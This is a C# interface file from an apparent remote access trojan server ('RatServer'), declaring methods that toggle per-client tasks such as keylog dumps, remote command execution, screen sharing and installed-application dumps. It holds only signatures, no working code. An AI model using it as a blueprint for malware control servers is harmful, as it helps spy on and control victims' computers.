using RatServer.Models.ViewModel.Client;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace RatServer.Interfaces.Client
{
    public interface IClientService
    {
        public Task<ClientVM> Insert(ClientVM clientVM);
        public Task<ClientVM> Select(string clientId);
        public Task<bool> Delete(string clientId);
        public Task<List<ClientVM>> SelectAll();

        public Task<bool> IfConnect(string clientId);
        public Task<bool> IsRegistered(string clientId);
        public Task<bool> IfUpdate(string clientId);
        public Task<bool> IfInstalledAplicationDump(string clientId);

        public Task<bool> IfKeyLogDump(string clientId);
        public Task<bool> IfCMDRun(string clientId);
        public Task<bool> IfScreenShare(string clientId);



        public Task<bool> SetForConnect(string clientId);
        public Task<bool> SetForRegistered(string clientId);
        public Task<bool> SetForUpdate(string clientId);
        public Task<bool> SetForNoUpdate(string clientId);
        public Task<bool> SetForCMDRun(string clientId);
        public Task<bool> SetForScreenShare(string clientId);
        public Task<bool> SetForKeyLogDump(string clientId);
        public Task<bool> SetForNoApplicationDump(string clientId);
        public Task<bool> SetForApplicationDump(string clientId);
        

        public Task<bool> SetAllForNoConnect();
        public Task<bool> SetAllForNoRegistered();
        public Task<bool> SetAllForNoUpdate();
        public Task<bool> SetAllForNoCMDRun();
        public Task<bool> SetAllForNoInstalledAplicationDump();
        public Task<bool> SetAllForNoScreenShare();
        public Task<bool> SetAllForNoKeyLogDump();
        public Task<bool> RegisterValue(string clientId, string data, string value);
        public Task<List<string>> GetValues(string clientId, string data);
    }
}
